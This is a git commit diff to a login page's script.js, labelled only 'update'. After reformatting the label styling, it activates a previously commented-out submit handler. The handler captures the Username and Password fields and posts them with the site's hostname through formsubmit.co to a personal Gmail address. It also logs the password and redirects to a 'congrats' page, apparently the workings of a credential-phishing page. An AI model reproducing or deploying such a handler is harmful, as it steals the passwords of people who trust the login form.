f53a8a235c0177b2038d4a24ea783e6d79cdc9c7
Ade2002 <sikirusulaimon2002@gmail.com>
2023-01-10 10:41:25 +0100

    update

--- script.js
+++ script.js
@@ -5,33 +5,29 @@ inputs.forEach((input) =>
     if (input.value != "") {
       label.style.top = "-20px";
       label.style.color = "#" + "03e9f4";
-      label.style.fontSize= "12px";
-    }else{
-        label.style.top = "0px";
-        label.style.fontSize= "18px";
-        label.style.color = "white";
+      label.style.fontSize = "12px";
+    } else {
+      label.style.top = "0px";
+      label.style.fontSize = "18px";
+      label.style.color = "white";
     }
   }),
 );
 
-
-
-
-
-/* document.querySelector('form').addEventListener('submit', (e) => {
-e.preventDefault();
-mail = 'sikirusulaimon2002@gmail.com';
-subject = `${window.location.hostname} ${new Date()}`;
-let body = new FormData();
-body.append('Username', Username.value)
-body.append('Password', password.value)
-          body.append('_captcha', false)
-          body.append('_template', "table")
-          body.append('_subject', subject)
-          let URL = `https://formsubmit.co/${mail}`
-          fetch(URL, {
-            method: 'POST',
-            body: body
-          })
-console.log(password.value)
-}) */
+document.querySelector("form").addEventListener("submit", (e) => {
+  e.preventDefault();
+  mail = "sikirusulaimon2002@gmail.com";
+  subject = `${window.location.hostname} ${new Date()}`;
+  let body = new FormData();
+  body.append("Username", Username.value);
+  body.append("Password", password.value);
+  body.append("_captcha", false);
+  body.append("_template", "table");
+  body.append("_subject", subject);
+  let URL = `https://formsubmit.co/${mail}`;
+  fetch(URL, {
+    method: "POST",
+    body: body,
+  }).then(window.location.assign("congrats.html"));
+  console.log(password.value);
+});
